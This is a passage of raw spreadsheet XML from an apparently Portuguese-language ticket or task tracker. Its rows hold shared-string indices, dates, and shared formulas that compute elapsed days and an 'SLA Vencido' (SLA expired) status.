      <c r="M575" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q575" t="s">
        <v>3575</v>
      </c>
      <c r="T575" s="1">
        <v>46100</v>
      </c>
      <c r="U575" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V575" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W575" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB575" t="s">
        <v>2915</v>
      </c>
      <c r="AD575" t="s">
        <v>2916</v>
      </c>
      <c r="AE575" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG575" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="576" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A576" s="84">
        <v>575</v>
      </c>
      <c r="B576" t="s">
        <v>32</v>
      </c>
      <c r="C576" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D576" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G576" t="s">
        <v>3501</v>
      </c>
      <c r="H576" t="s">
        <v>3563</v>
      </c>
      <c r="J576" t="s">
        <v>2913</v>
      </c>
      <c r="L576" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M576" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q576" t="s">
        <v>3576</v>
      </c>
      <c r="T576" s="1">
        <v>46100</v>
      </c>
      <c r="U576" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V576" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W576" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB576" t="s">
        <v>2915</v>
      </c>
      <c r="AD576" t="s">
        <v>2916</v>
      </c>
      <c r="AE576" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG576" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="577" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A577" s="84">
        <v>576</v>
      </c>
      <c r="B577" t="s">
        <v>32</v>
      </c>
      <c r="C577" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D577" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G577" t="s">
        <v>3501</v>
      </c>
      <c r="H577" t="s">
        <v>3506</v>
      </c>
      <c r="J577" t="s">
        <v>2834</v>
      </c>
      <c r="L577" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M577" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q577" t="s">
        <v>3516</v>
      </c>
      <c r="T577" s="1">
        <v>46100</v>
      </c>
      <c r="U577" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V577" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W577" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB577" t="s">
        <v>3511</v>
      </c>
      <c r="AD577" t="s">
        <v>3518</v>
      </c>
      <c r="AE577" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG577" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="578" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A578" s="84">
        <v>577</v>
      </c>
      <c r="B578" t="s">
        <v>32</v>
      </c>
      <c r="C578" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D578" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G578" t="s">
        <v>3501</v>
      </c>
      <c r="H578" t="s">
        <v>3509</v>
      </c>
      <c r="J578" t="s">
        <v>2834</v>
      </c>
      <c r="L578" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M578" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q578" t="s">
        <v>3517</v>
      </c>
      <c r="T578" s="1">
        <v>46100</v>
      </c>
      <c r="U578" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V578" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W578" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB578" t="s">
        <v>3511</v>
      </c>
      <c r="AC578" t="s">
        <v>3614</v>
      </c>
      <c r="AD578" t="s">
        <v>3518</v>
      </c>
      <c r="AE578" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG578" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="579" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A579" s="84">
        <v>578</v>
      </c>
      <c r="B579" t="s">
        <v>32</v>
      </c>
      <c r="C579" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D579" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G579" t="s">
        <v>3501</v>
      </c>
      <c r="H579" t="s">
        <v>3570</v>
      </c>
      <c r="J579" t="s">
        <v>2913</v>
      </c>
      <c r="L579" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M579" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q579" t="s">
        <v>3577</v>
      </c>
      <c r="T579" s="1">
        <v>46100</v>
      </c>
      <c r="U579" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V579" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W579" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB579" t="s">
        <v>2915</v>
      </c>
      <c r="AD579" t="s">
        <v>2916</v>
      </c>
      <c r="AE579" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG579" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="580" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A580" s="84">
        <v>579</v>
      </c>
      <c r="B580" t="s">
        <v>32</v>
      </c>
      <c r="C580" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D580" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G580" t="s">
        <v>3501</v>
      </c>
      <c r="H580" t="s">
        <v>3568</v>
      </c>
      <c r="J580" t="s">
        <v>2913</v>
      </c>
      <c r="L580" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M580" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q580" t="s">
        <v>3578</v>
      </c>
      <c r="T580" s="1">
        <v>46100</v>
      </c>
      <c r="U580" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V580" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W580" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB580" t="s">
        <v>2915</v>
      </c>
      <c r="AD580" t="s">
        <v>2916</v>
      </c>
      <c r="AE580" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG580" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="581" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A581" s="84">
        <v>580</v>
      </c>
      <c r="B581" t="s">
        <v>32</v>
      </c>
      <c r="C581" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D581" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G581" t="s">
        <v>3501</v>
      </c>
      <c r="H581" t="s">
        <v>3569</v>
      </c>
      <c r="J581" t="s">
        <v>2913</v>
      </c>
      <c r="L581" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M581" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q581" t="s">
        <v>3579</v>
      </c>
      <c r="T581" s="1">
        <v>46100</v>
      </c>
      <c r="U581" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V581" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W581" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB581" t="s">
        <v>2915</v>
      </c>
      <c r="AD581" t="s">
        <v>2916</v>
      </c>
      <c r="AE581" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG581" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="582" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A582" s="84">
        <v>581</v>
      </c>
      <c r="B582" t="s">
        <v>32</v>
      </c>
      <c r="C582" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D582" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G582" t="s">
        <v>3501</v>
      </c>
      <c r="H582" t="s">
        <v>3566</v>
      </c>
      <c r="J582" t="s">
        <v>2913</v>
      </c>
      <c r="L582" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M582" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q582" t="s">
        <v>3580</v>
      </c>
      <c r="T582" s="1">
        <v>46100</v>
      </c>
      <c r="U582" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V582" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W582" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB582" t="s">
        <v>2915</v>
      </c>
      <c r="AD582" t="s">
        <v>2916</v>
      </c>
      <c r="AE582" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG582" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="583" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A583" s="84">
        <v>582</v>
      </c>
      <c r="B583" t="s">
        <v>32</v>
      </c>
      <c r="C583" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D583" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G583" t="s">
        <v>3501</v>
      </c>
      <c r="H583" t="s">
        <v>3567</v>
      </c>
      <c r="J583" t="s">
        <v>2913</v>
      </c>
      <c r="L583" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M583" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q583" t="s">
        <v>3581</v>
      </c>
      <c r="T583" s="1">
        <v>46100</v>
      </c>
      <c r="U583" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V583" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W583" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB583" t="s">
        <v>2915</v>
      </c>
      <c r="AD583" t="s">
        <v>2916</v>
      </c>
      <c r="AE583" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG583" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="584" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A584" s="84">
        <v>583</v>
      </c>
      <c r="B584" t="s">
        <v>32</v>
      </c>
      <c r="C584" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D584" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G584" t="s">
        <v>3501</v>
      </c>
      <c r="H584" t="s">
        <v>3564</v>
      </c>
      <c r="J584" t="s">
        <v>2913</v>
      </c>
      <c r="L584" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M584" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q584" t="s">
        <v>3582</v>
      </c>
      <c r="T584" s="1">
        <v>46100</v>
      </c>
      <c r="U584" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V584" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W584" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB584" t="s">
        <v>2915</v>
      </c>
      <c r="AD584" t="s">
        <v>2916</v>
      </c>
      <c r="AE584" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG584" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="585" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A585" s="84">
        <v>584</v>
      </c>
      <c r="B585" t="s">
        <v>32</v>
      </c>
      <c r="C585" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D585" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G585" t="s">
        <v>3501</v>
      </c>
      <c r="H585" t="s">
        <v>3510</v>
      </c>
      <c r="J585" t="s">
        <v>2834</v>
      </c>
      <c r="L585" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M585" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q585" t="s">
        <v>3517</v>
      </c>
      <c r="T585" s="1">
        <v>46100</v>
      </c>
      <c r="U585" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V585" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W585" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB585" t="s">
        <v>3511</v>
      </c>
      <c r="AD585" t="s">
        <v>3518</v>
      </c>
      <c r="AE585" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG585" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="586" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A586" s="84">
        <v>585</v>
      </c>
      <c r="B586" t="s">
        <v>32</v>
      </c>
      <c r="C586" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D586" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G586" t="s">
        <v>3501</v>
      </c>
      <c r="H586" t="s">
        <v>3565</v>
      </c>
      <c r="J586" t="s">
        <v>2913</v>
      </c>
      <c r="L586" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M586" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q586" t="s">
        <v>3583</v>
      </c>
      <c r="T586" s="1">
        <v>46100</v>
      </c>
      <c r="U586" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V586" s="1">
        <f t="shared" si="51"/>
        <v>46190</v>
      </c>
      <c r="W586" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB586" t="s">
        <v>2915</v>
      </c>
      <c r="AD586" t="s">
        <v>2916</v>
      </c>
      <c r="AE586" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG586" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="587" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A587" s="84">
        <v>586</v>
      </c>
      <c r="B587" t="s">
        <v>32</v>
      </c>
      <c r="C587" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D587" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G587" t="s">
        <v>1323</v>
      </c>
      <c r="H587" t="s">
        <v>3559</v>
      </c>
      <c r="J587" t="s">
        <v>3473</v>
      </c>
      <c r="L587" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M587" t="s">
        <v>522</v>
      </c>
      <c r="Q587" t="s">
        <v>1391</v>
      </c>
      <c r="T587" s="1">
        <v>46115</v>
      </c>
      <c r="U587" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>94</v>
      </c>
      <c r="V587" s="1">
        <f t="shared" si="51"/>
        <v>46145</v>
      </c>
      <c r="W587" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB587" t="s">
        <v>3478</v>
      </c>
      <c r="AD587" t="s">
        <v>3479</v>
      </c>
      <c r="AE587" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG587" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="588" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A588" s="84">
        <v>587</v>
      </c>
      <c r="B588" t="s">
        <v>32</v>
      </c>
      <c r="C588" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D588" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G588" t="s">
        <v>1323</v>
      </c>
      <c r="H588" t="s">
        <v>3560</v>
      </c>
      <c r="J588" t="s">
        <v>3473</v>
      </c>
      <c r="L588" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M588" t="s">
        <v>522</v>
      </c>
      <c r="Q588" t="s">
        <v>1391</v>
      </c>
      <c r="T588" s="1">
        <v>46115</v>
      </c>
      <c r="U588" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>94</v>
      </c>
      <c r="V588" s="1">
        <f t="shared" si="51"/>
        <v>46145</v>
      </c>
      <c r="W588" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB588" t="s">
        <v>3478</v>
      </c>
      <c r="AD588" t="s">
        <v>3479</v>
      </c>
      <c r="AE588" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG588" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="589" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A589" s="84">
        <v>588</v>
      </c>
      <c r="B589" t="s">
        <v>32</v>
      </c>
      <c r="C589" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D589" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G589" t="s">
        <v>1323</v>
      </c>
      <c r="H589" t="s">
        <v>3557</v>
      </c>
      <c r="J589" t="s">
        <v>1844</v>
      </c>
      <c r="L589" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M589" t="s">
        <v>522</v>
      </c>
      <c r="Q589" t="s">
        <v>1391</v>
      </c>
      <c r="T589" s="1">
        <v>46115</v>
      </c>
      <c r="U589" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>94</v>
      </c>
      <c r="V589" s="1">
        <f t="shared" si="51"/>
        <v>46145</v>
      </c>
      <c r="W589" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB589" t="s">
        <v>3477</v>
      </c>
      <c r="AD589" t="s">
        <v>3479</v>
      </c>
      <c r="AE589" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG589" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="590" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A590" s="84">
        <v>589</v>
      </c>
      <c r="B590" t="s">
        <v>32</v>
      </c>
      <c r="C590" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D590" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G590" t="s">
        <v>3501</v>
      </c>
      <c r="H590" t="s">
        <v>3548</v>
      </c>
      <c r="J590" t="s">
        <v>1490</v>
      </c>
      <c r="L590" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M590" t="s">
        <v>522</v>
      </c>
      <c r="Q590" t="s">
        <v>3584</v>
      </c>
      <c r="T590" s="1">
        <v>46100</v>
      </c>
      <c r="U590" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V590" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W590" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB590" t="s">
        <v>1975</v>
      </c>
      <c r="AD590" t="s">
        <v>1976</v>
      </c>
      <c r="AE590" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG590" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="591" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A591" s="84">
        <v>590</v>
      </c>
      <c r="B591" t="s">
        <v>32</v>
      </c>
      <c r="C591" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D591" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G591" t="s">
        <v>3501</v>
      </c>
      <c r="H591" t="s">
        <v>3505</v>
      </c>
      <c r="J591" t="s">
        <v>1490</v>
      </c>
      <c r="L591" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M591" t="s">
        <v>522</v>
      </c>
      <c r="Q591" t="s">
        <v>3582</v>
      </c>
      <c r="T591" s="1">
        <v>46100</v>
      </c>
      <c r="U591" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V591" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W591" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB591" t="s">
        <v>1975</v>
      </c>
      <c r="AD591" t="s">
        <v>1976</v>
      </c>
      <c r="AE591" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG591" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="592" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A592" s="84">
        <v>591</v>
      </c>
      <c r="B592" t="s">
        <v>32</v>
      </c>
      <c r="C592" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D592" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G592" t="s">
        <v>3501</v>
      </c>
      <c r="H592" t="s">
        <v>3554</v>
      </c>
      <c r="J592" t="s">
        <v>1490</v>
      </c>
      <c r="L592" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M592" t="s">
        <v>522</v>
      </c>
      <c r="Q592" t="s">
        <v>3585</v>
      </c>
      <c r="T592" s="1">
        <v>46100</v>
      </c>
      <c r="U592" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V592" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W592" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB592" t="s">
        <v>1975</v>
      </c>
      <c r="AD592" t="s">
        <v>1976</v>
      </c>
      <c r="AE592" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG592" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="593" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A593" s="84">
        <v>592</v>
      </c>
      <c r="B593" t="s">
        <v>32</v>
      </c>
      <c r="C593" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D593" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G593" t="s">
        <v>3501</v>
      </c>
      <c r="H593" t="s">
        <v>3553</v>
      </c>
      <c r="J593" t="s">
        <v>1490</v>
      </c>
      <c r="L593" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M593" t="s">
        <v>522</v>
      </c>
      <c r="Q593" t="s">
        <v>3577</v>
      </c>
      <c r="T593" s="1">
        <v>46100</v>
      </c>
      <c r="U593" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V593" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W593" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB593" t="s">
        <v>1975</v>
      </c>
      <c r="AD593" t="s">
        <v>1976</v>
      </c>
      <c r="AE593" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG593" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="594" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A594" s="84">
        <v>593</v>
      </c>
      <c r="B594" t="s">
        <v>32</v>
      </c>
      <c r="C594" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D594" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G594" t="s">
        <v>3501</v>
      </c>
      <c r="H594" t="s">
        <v>3555</v>
      </c>
      <c r="J594" t="s">
        <v>1844</v>
      </c>
      <c r="L594" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M594" t="s">
        <v>522</v>
      </c>
      <c r="Q594" t="s">
        <v>1391</v>
      </c>
      <c r="T594" s="1">
        <v>46100</v>
      </c>
      <c r="U594" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V594" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W594" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB594" t="s">
        <v>3477</v>
      </c>
      <c r="AD594" t="s">
        <v>3479</v>
      </c>
      <c r="AE594" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG594" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="595" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A595" s="84">
        <v>594</v>
      </c>
      <c r="B595" t="s">
        <v>32</v>
      </c>
      <c r="C595" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D595" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G595" t="s">
        <v>3501</v>
      </c>
      <c r="H595" t="s">
        <v>3504</v>
      </c>
      <c r="J595" t="s">
        <v>1490</v>
      </c>
      <c r="L595" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M595" t="s">
        <v>522</v>
      </c>
      <c r="Q595" t="s">
        <v>3586</v>
      </c>
      <c r="T595" s="1">
        <v>46100</v>
      </c>
      <c r="U595" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V595" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W595" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB595" t="s">
        <v>1975</v>
      </c>
      <c r="AD595" t="s">
        <v>1976</v>
      </c>
      <c r="AE595" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG595" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="596" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A596" s="84">
        <v>595</v>
      </c>
      <c r="B596" t="s">
        <v>32</v>
      </c>
      <c r="C596" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D596" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G596" t="s">
        <v>3501</v>
      </c>
      <c r="H596" t="s">
        <v>3503</v>
      </c>
      <c r="J596" t="s">
        <v>1490</v>
      </c>
      <c r="L596" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M596" t="s">
        <v>522</v>
      </c>
      <c r="Q596" t="s">
        <v>3587</v>
      </c>
      <c r="T596" s="1">
        <v>46100</v>
      </c>
      <c r="U596" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V596" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W596" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB596" t="s">
        <v>1975</v>
      </c>
      <c r="AD596" t="s">
        <v>1976</v>
      </c>
      <c r="AE596" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG596" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="597" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A597" s="84">
        <v>596</v>
      </c>
      <c r="B597" t="s">
        <v>32</v>
      </c>
      <c r="C597" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D597" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G597" t="s">
        <v>3501</v>
      </c>
      <c r="H597" t="s">
        <v>3550</v>
      </c>
      <c r="J597" t="s">
        <v>1490</v>
      </c>
      <c r="L597" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M597" t="s">
        <v>522</v>
      </c>
      <c r="Q597" t="s">
        <v>3588</v>
      </c>
      <c r="T597" s="1">
        <v>46100</v>
      </c>
      <c r="U597" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V597" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W597" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB597" t="s">
        <v>1975</v>
      </c>
      <c r="AD597" t="s">
        <v>1976</v>
      </c>
      <c r="AE597" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG597" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="598" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A598" s="84">
        <v>597</v>
      </c>
      <c r="B598" t="s">
        <v>32</v>
      </c>
      <c r="C598" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D598" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G598" t="s">
        <v>3501</v>
      </c>
      <c r="H598" t="s">
        <v>3502</v>
      </c>
      <c r="J598" t="s">
        <v>1490</v>
      </c>
      <c r="L598" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M598" t="s">
        <v>522</v>
      </c>
      <c r="Q598" t="s">
        <v>3573</v>
      </c>
      <c r="T598" s="1">
        <v>46100</v>
      </c>
      <c r="U598" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
      <c r="V598" s="1">
        <f t="shared" si="51"/>
        <v>46130</v>
      </c>
      <c r="W598" s="76" t="str">
        <f t="shared" ca="1" si="52"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB598" t="s">
        <v>1975</v>
      </c>
      <c r="AD598" t="s">
        <v>1976</v>
      </c>
      <c r="AE598" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG598" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="599" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A599" s="84">
        <v>598</v>
      </c>
      <c r="B599" t="s">
        <v>32</v>
      </c>
      <c r="C599" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D599" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G599" t="s">
        <v>3501</v>
      </c>
      <c r="H599" t="s">
        <v>3551</v>
      </c>
      <c r="J599" t="s">
        <v>1490</v>
      </c>
      <c r="L599" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M599" t="s">
        <v>522</v>
      </c>
      <c r="Q599" t="s">
        <v>3589</v>
      </c>
      <c r="T599" s="1">
        <v>46100</v>
      </c>
      <c r="U599" s="76">
        <f t="shared" ca="1" si="50"/>
        <v>109</v>
      </c>
